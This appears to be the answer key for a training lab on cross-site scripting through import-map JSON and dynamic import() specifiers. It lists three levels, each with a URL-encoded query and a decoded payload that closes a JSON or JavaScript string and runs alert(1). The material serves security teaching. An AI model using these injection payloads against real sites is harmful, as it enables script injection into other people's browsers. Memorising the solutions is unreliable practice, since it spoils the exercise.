# import-map — solutions

Reflection into `<script type="importmap">` JSON or dynamic `import()` specifier. A user-controlled module URL can return JS that the browser executes.

### import-map-level1

`/import-map/level1/?query=%22%7D%7D%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"}}</script><script>alert(1)</script>`
- context: importmap JSON value; close JSON + script tag, then inject

### import-map-level2

`/import-map/level2/?query=%27%7D%7D);alert(1);//`

- payload: `'}});alert(1);//`
- context: value embedded into `JSON.stringify({imports:{app:'...'}})` — break out of the single-quoted JS string passed to JSON.stringify

### import-map-level3

`/import-map/level3/?query=%27;alert(1);//`

- payload: `';alert(1);//`
- context: assigned to `var url = '...'` then awaited in import(); break out of JS string
